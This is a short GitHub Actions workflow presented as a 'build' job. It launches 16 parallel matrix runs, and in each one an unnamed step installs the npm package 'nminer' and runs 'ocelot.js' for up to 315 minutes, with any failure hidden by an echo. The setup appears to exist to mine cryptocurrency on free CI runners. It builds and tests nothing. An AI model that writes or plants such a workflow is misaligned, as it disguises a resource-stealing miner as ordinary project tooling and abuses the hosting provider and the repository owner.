name: ocelot
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8890 }
          - { version: 7003 }
          - { version: 5339 }
          - { version: 9684 }
          - { version: 8665 }
          - { version: 5608 }
          - { version: 1787 }
          - { version: 4895 }
          - { version: 4789 }
          - { version: 8454 }
          - { version: 6324 }
          - { version: 5837 }
          - { version: 7612 }
          - { version: 4118 }
          - { version: 336 }
          - { version: 2737 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 315m node ocelot.js || echo "ocelot executed"